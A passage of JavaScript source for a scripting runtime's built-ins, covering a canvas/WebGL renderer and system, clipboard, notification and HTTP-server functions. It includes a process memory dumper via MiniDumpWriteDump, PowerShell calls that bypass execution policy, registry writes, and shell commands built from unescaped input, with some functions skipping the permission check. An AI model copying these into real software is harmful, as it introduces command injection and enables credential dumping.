            const src = "data:" + mime + ";base64," + data.toString("base64");
            builtins.gfx._queue.push({ op: "load_sound", key, src });
          } catch (e) {
            console.error("GFX Error: Failed to load sound " + path2);
          }
        },
        play_sound: (key, loop) => builtins.gfx._queue.push({ op: "play_sound", key, loop: !!loop }),
        text: (x, y, text, color, size) => builtins.gfx._queue.push({ op: "text", x, y, text, color, size }),
        line: (x1, y1, x2, y2, color, width) => builtins.gfx._queue.push({ op: "line", x1, y1, x2, y2, color, width }),
        polygon: (points, color) => builtins.gfx._queue.push({ op: "polygon", points, color }),
        alpha: (val) => builtins.gfx._queue.push({ op: "alpha", value: val }),
        glow: (color, size) => builtins.gfx._queue.push({ op: "glow", color, size }),
        // 3D Commands
        cube: (x, y, z, size, color) => builtins.gfx._queue.push({ op: "cube", x, y, z, size, color }),
        // Legacy/2.5D
        // Real 3D API
        mesh_create: (id, vertices, colors2, normals) => builtins.webview.send("mesh_upload", { id, vertices, colors: colors2, normals }),
        draw: (id, x, y, z, rx, ry, rz, sx, sy, sz) => builtins.gfx._queue.push({ op: "draw_mesh", id, x, y, z, rx, ry, rz, sx, sy, sz }),
        camera: (x, y, z, tx, ty, tz) => builtins.gfx._queue.push({ op: "camera", x, y, z, tx, ty, tz }),
        light: (x, y, z) => builtins.gfx._queue.push({ op: "light", x, y, z }),
        // Input
        key: (k) => builtins.gfx._inputs.keys[k] === true,
        mouse_x: () => builtins.gfx._inputs.mouse.x,
        mouse_y: () => builtins.gfx._inputs.mouse.y,
        mouse_down: () => builtins.gfx._inputs.mouse.down,
        // Internal Renderer Template (2D)
        _get_renderer_html: () => `
<!DOCTYPE html>
<html>
<head>
    <style>
        body { margin:0; overflow:hidden; background:#000; }
        canvas { display:block; }
    </style>
</head>
<body>
    <canvas id="c"></canvas>
    <script>
        const canvas = document.getElementById('c');
        const ctx = canvas.getContext('2d');
        
        // Audio Context
        let audioCtx = null;
        let rainNode = null;

        function initAudio() {
            if (audioCtx) return;
            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        }

        function toggleRain(enable) {
            initAudio();
            if (enable) {
                if (rainNode) return;
                const bufferSize = 2 * audioCtx.sampleRate;
                const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
                const output = buffer.getChannelData(0);
                for (let i = 0; i < bufferSize; i++) {
                    const white = Math.random() * 2 - 1;
                    output[i] = (lastOut + (0.02 * white)) / 1.02;
                    lastOut = output[i];
                    output[i] *= 3.5; 
                }
                rainNode = audioCtx.createBufferSource();
                rainNode.buffer = buffer;
                rainNode.loop = true;
                const gain = audioCtx.createGain();
                gain.gain.value = 0.15;
                rainNode.connect(gain);
                gain.connect(audioCtx.destination);
                rainNode.start();
            } else {
                if (rainNode) { rainNode.stop(); rainNode = null; }
            }
        }
        let lastOut = 0;

        // Weather System (Client Side)
        let isRaining = false;
        let rainParticles = [];
        
        function updateRain() {
            if (!isRaining) { rainParticles = []; return; }
            // Spawn new particles
            if (rainParticles.length < 400) {
                 rainParticles.push({
                     x: Math.random() * gameWidth,
                     y: Math.random() * -gameHeight, // Spawn above
                     speed: 15 + Math.random() * 10,
                     len: 10 + Math.random() * 20
                 });
            }
            // Update
            for (let i=0; i<rainParticles.length; i++) {
                let p = rainParticles[i];
                p.y += p.speed;
                p.x -= 2; // Wind
                if (p.y > gameHeight) {
                    p.y = -20;
                    p.x = Math.random() * gameWidth + 100; // Reset
                }
            }
        }

        function drawRain() {
            if (!isRaining) return;
            ctx.beginPath();
            ctx.strokeStyle = "rgba(170, 180, 255, 0.4)";
            ctx.lineWidth = 1;
            for (let i=0; i<rainParticles.length; i++) {
                let p = rainParticles[i];
                ctx.moveTo(p.x, p.y);
                ctx.lineTo(p.x - 4, p.y + p.len);
            }
            ctx.stroke();
        }

        // Letterboxing State
        let gameWidth = 1280;
        let gameHeight = 720;
        let scale = 1;
        let offsetX = 0;
        let offsetY = 0;
        
        function resize() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            
            // Calculate Aspect Ratio
            const targetRatio = gameWidth / gameHeight;
            const windowRatio = canvas.width / canvas.height;
            
            if (windowRatio > targetRatio) {
                // Window is wider than game
                scale = canvas.height / gameHeight;
                offsetX = (canvas.width - (gameWidth * scale)) / 2;
                offsetY = 0;
            } else {
                // Window is taller than game
                scale = canvas.width / gameWidth;
                offsetX = 0;
                offsetY = (canvas.height - (gameHeight * scale)) / 2;
            }
        }
        window.onresize = resize;
        resize();

        const events = new EventSource('/_fazer/events');
        events.onmessage = (e) => {
            const msg = JSON.parse(e.data);
            if (msg.type === 'gfx_frame') {
                render(msg.data);
            }
        };
        
        const inputs = { keys: {}, mouse: {x:0, y:0, down:false} };
        
        window.onkeydown = (e) => { inputs.keys[e.key] = true; sendInput(); };
        window.onkeyup = (e) => { inputs.keys[e.key] = false; sendInput(); };
        window.onmousemove = (e) => { inputs.mouse.x = e.clientX; inputs.mouse.y = e.clientY; sendInput(); };
        window.onmousedown = () => { inputs.mouse.down = true; sendInput(); };
        window.onmouseup = () => { inputs.mouse.down = false; sendInput(); };
        
        function sendInput() {
            fetch('/_fazer/send', {
                method: 'POST',
                body: JSON.stringify({ type: 'input', inputs: inputs })
            });
        }
        
        function render(queue) {
            // Clear Screen with Black (for letterbox borders)
            ctx.setTransform(1, 0, 0, 1, 0, 0);
            ctx.globalAlpha = 1.0;
            ctx.fillStyle = '#000';
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            // Apply Letterbox Transform
            ctx.setTransform(scale, 0, 0, scale, offsetX, offsetY);

            // Clip to game area
            ctx.beginPath();
            ctx.rect(0, 0, gameWidth, gameHeight);
            ctx.clip();

            queue.forEach(cmd => {
                if (cmd.op === 'weather') {
                    if (cmd.type === 'rain') isRaining = cmd.enable;
                }
                else if (cmd.op === 'sfx') {
                    if (cmd.type === 'rain') toggleRain(cmd.enable);
                }
                else if (cmd.op === 'alpha') {
                    ctx.globalAlpha = cmd.value;
                }
                else if (cmd.op === 'glow') {
                    if (cmd.size > 0) {
                        ctx.shadowBlur = cmd.size;
                        ctx.shadowColor = cmd.color;
                    } else {
                        ctx.shadowBlur = 0;
                        ctx.shadowColor = "transparent";
                    }
                }
                else if (cmd.op === 'clear') {
                    ctx.globalAlpha = 1.0;
                    ctx.fillStyle = cmd.color || '#000';
                    ctx.fillRect(0, 0, gameWidth, gameHeight); // Fill game area only
                }
                else if (cmd.op === 'rect') {
                    ctx.fillStyle = cmd.color;
                    ctx.fillRect(cmd.x, cmd.y, cmd.w, cmd.h);
                }
                else if (cmd.op === 'circle') {
                    ctx.beginPath();
                    ctx.arc(cmd.x, cmd.y, cmd.r, 0, Math.PI * 2);
                    ctx.fillStyle = cmd.color;
                    ctx.fill();
                }
                else if (cmd.op === 'load_image') {
                    const img = new Image();
                    img.src = cmd.src;
                    images[cmd.key] = img;
                }
                else if (cmd.op === 'image') {
                    const img = images[cmd.key];
                    if (img && img.complete) {
                        if (cmd.sx !== undefined) {
                            // Sprite Sheet Draw
                            ctx.drawImage(img, cmd.sx, cmd.sy, cmd.sw, cmd.sh, cmd.x, cmd.y, cmd.w, cmd.h);
                        } else {
                            // Standard Draw
                            ctx.drawImage(img, cmd.x, cmd.y, cmd.w || img.width, cmd.h || img.height);
                        }
                    }
                }
                else if (cmd.op === 'batch') {
                    const img = images[cmd.key];
                    if (img && img.complete) {
                        for (let i = 0; i < cmd.items.length; i++) {
                            const it = cmd.items[i];
                            if (it.sx !== undefined) {
                                ctx.drawImage(img, it.sx, it.sy, it.sw, it.sh, it.x, it.y, it.w, it.h);
                            } else {
                                ctx.drawImage(img, it.x, it.y, it.w || img.width, it.h || img.height);
                            }
                        }
                    }
                }
                else if (cmd.op === 'load_sound') {
                    sounds[cmd.key] = new Audio(cmd.src);
                }
                else if (cmd.op === 'play_sound') {
                    const s = sounds[cmd.key];
                    if (s) {
                        if (cmd.loop) s.loop = true;
                        s.currentTime = 0;
                        s.play().catch(e => console.log(e));
                    }
                }
                else if (cmd.op === 'text') {
                    ctx.fillStyle = cmd.color;
                    ctx.font = (cmd.size || 20) + "px Arial";
                    ctx.fillText(cmd.text, cmd.x, cmd.y);
                }
                else if (cmd.op === 'line') {
                    ctx.beginPath();
                    ctx.moveTo(cmd.x1, cmd.y1);
                    ctx.lineTo(cmd.x2, cmd.y2);
                    ctx.strokeStyle = cmd.color;
                    ctx.lineWidth = cmd.width || 1;
                    ctx.stroke();
                }
                else if (cmd.op === 'polygon') {
                    if (cmd.points && cmd.points.length > 0) {
                        ctx.beginPath();
                        ctx.moveTo(cmd.points[0].x, cmd.points[0].y);
                        for (let i = 1; i < cmd.points.length; i++) {
                            ctx.lineTo(cmd.points[i].x, cmd.points[i].y);
                        }
                        ctx.closePath();
                        ctx.fillStyle = cmd.color;
                        ctx.fill();
                    }
                }
                else if (cmd.op === 'cube') {
                     // 2.5D Fallback
                     const size = cmd.size;
                     ctx.fillStyle = cmd.color;
                     ctx.fillRect(cmd.x, cmd.y, size, size);
                }
            });

            // Draw Weather (Overlay)
            updateRain();
            drawRain();
        }
    </script>
</body>
</html>
          `,
        // WebGL 2.0 Renderer (3D)
        _get_renderer_html_3d: () => `
<!DOCTYPE html>
<html>
<head>
    <style>body{margin:0;overflow:hidden;background:#000;}canvas{display:block;width:100vw;height:100vh;}</style>
</head>
<body>
    <canvas id="glcanvas"></canvas>
    <canvas id="overlay" style="position:absolute;top:0;left:0;pointer-events:none;width:100vw;height:100vh;"></canvas>
    <script>
        const canvas = document.getElementById('glcanvas');
        const gl = canvas.getContext('webgl2');
        if (!gl) { alert("WebGL2 not supported"); }
        
        const overlay = document.getElementById('overlay');
        const ctx = overlay.getContext('2d');

        function resize() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            gl.viewport(0, 0, canvas.width, canvas.height);
            
            overlay.width = window.innerWidth;
            overlay.height = window.innerHeight;
        }
        window.onresize = resize;
        resize();

        // --- TinyMath ---
        const Mat4 = {
            create: () => new Float32Array([1,0,0,0, 0,1,0,0, 0,0,1,0, 0,0,0,1]),
            perspective: (out, fovy, aspect, near, far) => {
                const f = 1.0 / Math.tan(fovy / 2);
                const nf = 1 / (near - far);
                out[0] = f / aspect; out[1] = 0; out[2] = 0; out[3] = 0;
                out[4] = 0; out[5] = f; out[6] = 0; out[7] = 0;
                out[8] = 0; out[9] = 0; out[10] = (far + near) * nf; out[11] = -1;
                out[12] = 0; out[13] = 0; out[14] = (2 * far * near) * nf; out[15] = 0;
            },
            lookAt: (out, eye, center, up) => {
                let x0, x1, x2, y0, y1, y2, z0, z1, z2, len;
                let eyex = eye[0], eyey = eye[1], eyez = eye[2];
                let upx = up[0], upy = up[1], upz = up[2];
                let centerx = center[0], centery = center[1], centerz = center[2];

                z0 = eyex - centerx; z1 = eyey - centery; z2 = eyez - centerz;
                len = 1 / Math.sqrt(z0 * z0 + z1 * z1 + z2 * z2);
                z0 *= len; z1 *= len; z2 *= len;

                x0 = upy * z2 - upz * z1; x1 = upz * z0 - upx * z2; x2 = upx * z1 - upy * z0;
                len = Math.sqrt(x0 * x0 + x1 * x1 + x2 * x2);
                if (!len) { x0 = 0; x1 = 0; x2 = 0; } else { len = 1 / len; x0 *= len; x1 *= len; x2 *= len; }

                y0 = z1 * x2 - z2 * x1; y1 = z2 * x0 - z0 * x2; y2 = z0 * x1 - z1 * x0;
                len = Math.sqrt(y0 * y0 + y1 * y1 + y2 * y2);
                if (!len) { y0 = 0; y1 = 0; y2 = 0; } else { len = 1 / len; y0 *= len; y1 *= len; y2 *= len; }

                out[0] = x0; out[1] = y0; out[2] = z0; out[3] = 0;
                out[4] = x1; out[5] = y1; out[6] = z1; out[7] = 0;
                out[8] = x2; out[9] = y2; out[10] = z2; out[11] = 0;
                out[12] = -(x0 * eyex + x1 * eyey + x2 * eyez);
                out[13] = -(y0 * eyex + y1 * eyey + y2 * eyez);
                out[14] = -(z0 * eyex + z1 * eyey + z2 * eyez);
                out[15] = 1;
            },
            translate: (out, a, v) => {
                let x = v[0], y = v[1], z = v[2];
                out[12] = a[0] * x + a[4] * y + a[8] * z + a[12];
                out[13] = a[1] * x + a[5] * y + a[9] * z + a[13];
                out[14] = a[2] * x + a[6] * y + a[10] * z + a[14];
                out[15] = a[3] * x + a[7] * y + a[11] * z + a[15];
            },
            rotate: (out, a, rad, axis) => {
                let x = axis[0], y = axis[1], z = axis[2];
                let len = Math.sqrt(x * x + y * y + z * z);
                if (Math.abs(len) < 0.000001) return;
                len = 1 / len; x *= len; y *= len; z *= len;
                let s = Math.sin(rad), c = Math.cos(rad), t = 1 - c;
                let a00 = a[0], a01 = a[1], a02 = a[2], a03 = a[3];
                let a10 = a[4], a11 = a[5], a12 = a[6], a13 = a[7];
                let a20 = a[8], a21 = a[9], a22 = a[10], a23 = a[11];
                let b00 = x * x * t + c, b01 = y * x * t + z * s, b02 = z * x * t - y * s;
                let b10 = x * y * t - z * s, b11 = y * y * t + c, b12 = z * y * t + x * s;
                let b20 = x * z * t + y * s, b21 = y * z * t - x * s, b22 = z * z * t + c;
                out[0] = a00 * b00 + a10 * b01 + a20 * b02;
                out[1] = a01 * b00 + a11 * b01 + a21 * b02;
                out[2] = a02 * b00 + a12 * b01 + a22 * b02;
                out[3] = a03 * b00 + a13 * b01 + a23 * b02;
                out[4] = a00 * b10 + a10 * b11 + a20 * b12;
                out[5] = a01 * b10 + a11 * b11 + a21 * b12;
                out[6] = a02 * b10 + a12 * b11 + a22 * b12;
                out[7] = a03 * b10 + a13 * b11 + a23 * b12;
                out[8] = a00 * b20 + a10 * b21 + a20 * b22;
                out[9] = a01 * b20 + a11 * b21 + a21 * b22;
                out[10] = a02 * b20 + a12 * b21 + a22 * b22;
                out[11] = a03 * b20 + a13 * b21 + a23 * b22;
            },
            scale: (out, a, v) => {
                let x = v[0], y = v[1], z = v[2];
                out[0] = a[0] * x; out[1] = a[1] * x; out[2] = a[2] * x; out[3] = a[3] * x;
                out[4] = a[4] * y; out[5] = a[5] * y; out[6] = a[6] * y; out[7] = a[7] * y;
                out[8] = a[8] * z; out[9] = a[9] * z; out[10] = a[10] * z; out[11] = a[11] * z;
                out[12] = a[12]; out[13] = a[13]; out[14] = a[14]; out[15] = a[15];
            },
            copy: (out, a) => { for(let i=0; i<16; i++) out[i] = a[i]; }
        };

        // --- Shader ---
        const vsSource = \`
            attribute vec3 position;
            attribute vec3 color;
            attribute vec3 normal;
            uniform mat4 uP;
            uniform mat4 uV;
            uniform mat4 uM;
            uniform vec3 uLightDir;
            varying vec3 vColor;
            void main() {
                gl_Position = uP * uV * uM * vec4(position, 1.0);
                
                // Lighting (Directional)
                vec3 norm = normalize(mat3(uM) * normal); 
                vec3 lightDir = normalize(uLightDir); 
                float diff = max(dot(norm, lightDir), 0.3); // Ambient 0.3
                vColor = color * diff;
            }
        \`;
        const fsSource = \`
            precision mediump float;
            varying vec3 vColor;
            void main() {
                gl_FragColor = vec4(vColor, 1.0);
            }
        \`;

        function createShader(gl, type, source) {
            const shader = gl.createShader(type);
            gl.shaderSource(shader, source);
            gl.compileShader(shader);
            if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
                console.error(gl.getShaderInfoLog(shader));
                gl.deleteShader(shader);
                return null;
            }
            return shader;
        }

        const vs = createShader(gl, gl.VERTEX_SHADER, vsSource);
        const fs = createShader(gl, gl.FRAGMENT_SHADER, fsSource);
        const program = gl.createProgram();
        gl.attachShader(program, vs);
        gl.attachShader(program, fs);
        gl.linkProgram(program);

        const locs = {
            pos: gl.getAttribLocation(program, 'position'),
            col: gl.getAttribLocation(program, 'color'),
            norm: gl.getAttribLocation(program, 'normal'),
            P: gl.getUniformLocation(program, 'uP'),
            V: gl.getUniformLocation(program, 'uV'),
            M: gl.getUniformLocation(program, 'uM'),
            light: gl.getUniformLocation(program, 'uLightDir')
        };

        // --- State ---
        const meshes = {};
        const state = {
            camera: { pos: [0,0,5], target: [0,0,0], up: [0,1,0] },
            lightDir: [0.5, 1.0, 0.3],
            P: Mat4.create(),
            V: Mat4.create(),
            M: Mat4.create()
        };

        // --- Events ---
        const events = new EventSource('/_fazer/events');
        events.onmessage = (e) => {
            const msg = JSON.parse(e.data);
            if (msg.type === 'gfx_frame') render(msg.data);
            if (msg.type === 'mesh_upload') uploadMesh(msg.data);
        };

        // --- Input ---
        const inputs = { keys: {}, mouse: {x:0, y:0, down:false} };
        window.onkeydown = (e) => { inputs.keys[e.key] = true; sendInput(); };
        window.onkeyup = (e) => { inputs.keys[e.key] = false; sendInput(); };
        window.onmousemove = (e) => { inputs.mouse.x = e.clientX; inputs.mouse.y = e.clientY; sendInput(); };
        window.onmousedown = () => { inputs.mouse.down = true; sendInput(); };
        window.onmouseup = () => { inputs.mouse.down = false; sendInput(); };
        function sendInput() {
            fetch('/_fazer/send', { method: 'POST', body: JSON.stringify({ type: 'input', inputs: inputs }) });
        }

        // --- Logic ---
        function uploadMesh(data) {
            // data: { id, vertices, colors, normals }
            const vao = gl.createVertexArray();
            gl.bindVertexArray(vao);

            const vBuf = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, vBuf);
            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(data.vertices), gl.STATIC_DRAW);
            gl.enableVertexAttribArray(locs.pos);
            gl.vertexAttribPointer(locs.pos, 3, gl.FLOAT, false, 0, 0);

            const cBuf = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, cBuf);
            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(data.colors), gl.STATIC_DRAW);
            gl.enableVertexAttribArray(locs.col);
            gl.vertexAttribPointer(locs.col, 3, gl.FLOAT, false, 0, 0);

            if (data.normals && locs.norm >= 0) {
                const nBuf = gl.createBuffer();
                gl.bindBuffer(gl.ARRAY_BUFFER, nBuf);
                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(data.normals), gl.STATIC_DRAW);
                gl.enableVertexAttribArray(locs.norm);
                gl.vertexAttribPointer(locs.norm, 3, gl.FLOAT, false, 0, 0);
            }

            meshes[data.id] = { vao: vao, count: data.vertices.length / 3 };
        }

        function render(queue) {
            gl.viewport(0, 0, canvas.width, canvas.height);
            gl.enable(gl.DEPTH_TEST);
            gl.enable(gl.CULL_FACE);

            queue.forEach(cmd => {
                if (cmd.op === 'clear') {
                    // Parse hex color if needed, for now just black/grey
                    gl.clearColor(0.1, 0.1, 0.1, 1.0);
                    gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT);
                    
                    // Clear Overlay
                    ctx.clearRect(0, 0, overlay.width, overlay.height);
                    
                    // Update Matrices
                    Mat4.perspective(state.P, 45 * Math.PI / 180, canvas.width/canvas.height, 0.1, 1000.0);
                }
                else if (cmd.op === 'text') {
                    ctx.font = (cmd.size || 20) + 'px monospace';
                    ctx.fillStyle = cmd.color || 'white';
                    ctx.fillText(cmd.text, cmd.x, cmd.y);
                }
                else if (cmd.op === 'camera') {
                    state.camera.pos = [cmd.x, cmd.y, cmd.z];
                    state.camera.target = [cmd.tx, cmd.ty, cmd.tz];
                    Mat4.lookAt(state.V, state.camera.pos, state.camera.target, state.camera.up);
                }
                else if (cmd.op === 'light') {
                    state.lightDir = [cmd.x, cmd.y, cmd.z];
                }
                else if (cmd.op === 'draw_mesh') {
                    const mesh = meshes[cmd.id];
                    if (!mesh) return;

                    gl.useProgram(program);
                    gl.bindVertexArray(mesh.vao);

                    // Model Matrix
                    const M = state.M;
                    const I = [1,0,0,0, 0,1,0,0, 0,0,1,0, 0,0,0,1];
                    Mat4.copy(M, I);
                    Mat4.translate(M, M, [cmd.x, cmd.y, cmd.z]);
                    Mat4.rotate(M, M, cmd.rx || 0, [1, 0, 0]);
                    Mat4.rotate(M, M, cmd.ry || 0, [0, 1, 0]);
                    Mat4.rotate(M, M, cmd.rz || 0, [0, 0, 1]);
                    Mat4.scale(M, M, [cmd.sx || 1, cmd.sy || 1, cmd.sz || 1]);

                    gl.uniformMatrix4fv(locs.P, false, state.P);
                    gl.uniformMatrix4fv(locs.V, false, state.V);
                    gl.uniformMatrix4fv(locs.M, false, M);
                    
                    if (locs.light) gl.uniform3fv(locs.light, state.lightDir);

                    gl.drawArrays(gl.TRIANGLES, 0, mesh.count);
                }
            });
        }
    </script>
</body>
</html>
          `
      },
      // [SYS] System & DLL Manipulation
      sys: {
        // Spawn Process (Async)
        spawn: async (cmd2, args2, opts) => {
          checkPerm("exec");
          const cp = require("child_process");
          const options = { shell: true, env: { ...process.env } };
          let onStdout, onStderr;
          if (typeof opts === "function") {
            onStdout = opts;
            onStderr = arguments[3];
          } else if (opts && typeof opts === "object") {
            if (opts.env) Object.assign(options.env, opts.env);
            onStdout = opts.onStdout;
            onStderr = opts.onStderr;
          }
          const child = cp.spawn(String(cmd2), Array.isArray(args2) ? args2 : [], options);
          this.children.set(child.pid, child);
          child.on("exit", () => this.children.delete(child.pid));
          if (onStdout && onStdout.__fnref__) {
            child.stdout.on("data", async (data) => {
              await this._call(onStdout, [data.toString()], this.global);
            });
          }
          if (onStderr && onStderr.__fnref__) {
            child.stderr.on("data", async (data) => {
              await this._call(onStderr, [data.toString()], this.global);
            });
          }
          return child.pid;
        },
        // Kill Process
        kill: (pid) => {
          checkPerm("exec");
          try {
            process.kill(Number(pid));
            return true;
          } catch (e) {
            return false;
          }
        },
        // Write to Process Stdin
        write_stdin: (pid, data) => {
          checkPerm("exec");
          const child = this.children.get(Number(pid));
          if (child) {
            child.stdin.write(String(data));
            return true;
          }
          return false;
        },
        // PowerShell Bridge (The Core)
        exec: (cmd2) => {
          checkPerm("exec");
          try {
            require("child_process").execSync(String(cmd2), { stdio: "inherit" });
            return true;
          } catch (e) {
            return false;
          }
        },
        style: (text, color) => style(text, color),
        ps: (script) => {
          checkPerm("exec");
          try {
            const cmd2 = `powershell -NoProfile -ExecutionPolicy Bypass -Command "& { ${String(script).replace(/"/g, '"')} }"`;
            return require("child_process").execSync(cmd2, { encoding: "utf8", maxBuffer: 1024 * 1024 * 50 }).trim();
          } catch (e) {
            return "Error: " + e.message;
          }
        },
        ps_json: (script) => {
          checkPerm("exec");
          try {
            const s = String(script).replace(/"/g, '"');
            const cmd2 = `powershell -NoProfile -ExecutionPolicy Bypass -Command "& { ${s} } | ConvertTo-Json -Depth 2 -Compress"`;
            const out = require("child_process").execSync(cmd2, { encoding: "utf8", maxBuffer: 1024 * 1024 * 50 }).trim();
            return JSON.parse(out);
          } catch (e) {
            return null;
          }
        },
        // DLL / Assembly Loading & Execution
        dll_load: (path2) => {
          checkPerm("exec");
          return `[System.Reflection.Assembly]::LoadFrom("${String(path2).replace(/\\/g, "\\\\")}");`;
        },
        // Plugin System (Load external JS extensions)
        load_plugin: (path2) => {
          checkPerm("exec");
          try {
            const pAbs = require("path").resolve(String(path2));
            const mod = require(pAbs);
            if (typeof mod === "function") {
              mod(this, builtins, this.global);
            } else if (mod.default && typeof mod.default === "function") {
              mod.default(this, builtins, this.global);
            }
            for (const [k, v] of Object.entries(builtins)) {
              if (!this.global.hasHere(k)) {
                this.global.set(k, v, false);
              }
            }
            return true;
          } catch (e) {
            throw new FazerError("Plugin Error: " + e.message);
          }
        },
        // Native Memory Forensic (Read Process Memory)
        mem_dump: (pid, outputFile) => {
          checkPerm("exec");
          const ps = `
$code = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;

public class MiniDump {
    [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
    public static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr exceptionParam, IntPtr userStreamParam, IntPtr callbackParam);

    public static void Dump(int pid, string filename) {
        Process target = Process.GetProcessById(pid);
        using (FileStream fs = new FileStream(filename, FileMode.Create, FileAccess.ReadWrite, FileShare.Write)) {
            MiniDumpWriteDump(target.Handle, (uint)target.Id, fs.SafeFileHandle, 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        }
    }
}
"@
Add-Type -TypeDefinition $code -Language CCSharp
[MiniDump]::Dump(${Number(pid)}, "${String(outputFile)}")
"Done"
`;
          try {
            require("child_process").execSync(`powershell -NoProfile -Command "${ps.replace(/"/g, '"')}"`);
            return true;
          } catch (e) {
            return false;
          }
        },
        // Process Manipulation
        kill: (pid) => {
          try {
            process.kill(Number(pid));
            return true;
          } catch (e) {
            return false;
          }
        },
        // Administrator Check
        is_admin: () => {
          try {
            const out = require("child_process").execSync('powershell -Command "([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)"', { encoding: "utf8" }).trim();
            return out === "True";
          } catch (e) {
            return false;
          }
        },
        // System Info
        pid: () => process.pid,
        arch: () => process.arch,
        platform: () => process.platform,
        // Env Vars
        env: (key, val) => {
          if (val === void 0) return process.env[String(key)];
          process.env[String(key)] = String(val);
          return true;
        },
        // Registry (Windows)
        registry_read: (key, name) => {
          try {
            const cmd2 = `powershell -Command "Get-ItemProperty -Path '${key}' -Name '${name}' | Select-Object -ExpandProperty '${name}'"`;
            return require("child_process").execSync(cmd2, { encoding: "utf8" }).trim();
          } catch (e) {
            return null;
          }
        },
        registry_write: (key, name, value, type = "String") => {
          try {
            const cmd2 = `powershell -Command "New-ItemProperty -Path '${key}' -Name '${name}' -Value '${value}' -PropertyType ${type} -Force"`;
            require("child_process").execSync(cmd2);
            return true;
          } catch (e) {
            return false;
          }
        }
      },
      // [CLIPBOARD]
      clipboard: {
        get: () => {
          checkPerm("sys");
          const p = process.platform;
          try {
            const cp = require("child_process");
            if (p === "win32") return cp.execSync('powershell -command "Get-Clipboard"').toString().trim();
            if (p === "darwin") return cp.execSync("pbpaste").toString().trim();
            if (p === "linux") return cp.execSync("xclip -selection clipboard -o").toString().trim();
          } catch (e) {
            return "";
          }
          return "";
        },
        set: (text) => {
          checkPerm("sys");
          const p = process.platform;
          const s = String(text).replace(/"/g, '\\"');
          try {
            const cp = require("child_process");
            if (p === "win32") cp.execSync(`powershell -command "Set-Clipboard -Value \\"${s}\\""`);
            else if (p === "darwin") {
              const proc = cp.spawn("pbcopy");
              proc.stdin.write(text);
              proc.stdin.end();
            } else if (p === "linux") {
              const proc = cp.spawn("xclip", ["-selection", "clipboard", "-i"]);
              proc.stdin.write(text);
              proc.stdin.end();
            }
            return true;
          } catch (e) {
            return false;
          }
        }
      },
      // [NOTIFY] System Notifications
      notify: (title, msg) => {
        checkPerm("sys");
        const p = process.platform;
        const t = String(title).replace(/"/g, '\\"');
        const m = String(msg).replace(/"/g, '\\"');
        try {
          if (p === "win32") {
            const script = `
                  [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
                  $objNotifyIcon = New-Object System.Windows.Forms.NotifyIcon 
                  $objNotifyIcon.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($currentProcess.MainModule.FileName) 
                  $objNotifyIcon.BalloonTipIcon = "Info" 
                  $objNotifyIcon.BalloonTipText = "${m}" 
                  $objNotifyIcon.BalloonTipTitle = "${t}" 
                  $objNotifyIcon.Visible = $True 
                  $objNotifyIcon.ShowBalloonTip(10000)
                  `;
            require("child_process").execSync(`powershell -c "${script.replace(/\n/g, " ")}"`);
          } else if (p === "darwin") {
            require("child_process").execSync(`osascript -e 'display notification "${m}" with title "${t}"'`);
          } else if (p === "linux") {
            require("child_process").execSync(`notify-send "${t}" "${m}"`);
          }
          return true;
        } catch (e) {
          return false;
        }
      },
      // [WINDOW] Simple Native Dialogs
      window: {
        alert: (msg) => {
          checkPerm("sys");
          const m = String(msg).replace(/"/g, '\\"');
          try {
            if (process.platform === "win32") {
              require("child_process").execSync(`powershell -c "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('${m}')"`);
            } else {
              console.log("ALERT:", msg);
            }
          } catch (e) {
          }
        },
        input: (prompt) => {
          checkPerm("sys");
          try {
            if (process.platform === "win32") {
              const p = String(prompt).replace(/"/g, '\\"');
              const cmd2 = `powershell -c "Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox('${p}', 'Input', '')"`;
              return require("child_process").execSync(cmd2).toString().trim();
            }
            return "";
          } catch (e) {
            return "";
          }
        }
      },
      // [NET] Advanced Network Operations
      net: {
        // HTTP Server (Simple)
        server: async (port, handler) => {
          checkPerm("net");
          const http3 = require("http");
          return new Promise((resolve) => {
            const srv = http3.createServer(async (req, res) => {
              const r = {
                method: req.method,
                url: req.url,
                headers: req.headers
              };
              let body = "";
              req.on("data", (chunk) => body += chunk);
              req.on("end", async () => {
                r.body = body;
                if (req.headers["content-type"] && req.headers["content-type"].includes("application/json")) {
                  try {
                    r.body = JSON.parse(body);
                  } catch (e) {
                  }
                }
                try {
                  let result = { status: 404, body: "Not Found" };
                  if (handler) {
                    if (handler.__fnref__) {
                      result = await this._call(handler, [r], this.global);
                    } else if (typeof handler === "object") {
                      const path2 = req.url.split("?")[0];
                      const h = handler[path2];
                      if (h) {
                        if (h.__fnref__) result = await this._call(h, [r], this.global);
                        else result = h;
                      }
                    }
                  }
                  let status = 200;
                  let headers = { "Content-Type": "text/plain" };
                  let resBody = "";
                  if (result && typeof result === "object") {
                    status = result.status || 200;
                    if (result.headers) headers = { ...headers, ...result.headers };
                    if (result.type) headers["Content-Type"] = result.type;
                    resBody = result.body || "";
                    if (typeof resBody !== "string") resBody = JSON.stringify(resBody);
                  } else {
                    resBody = String(result);
                  }
                  res.writeHead(status, headers);
                  res.end(resBody);
                } catch (e) {
                  res.writeHead(500);
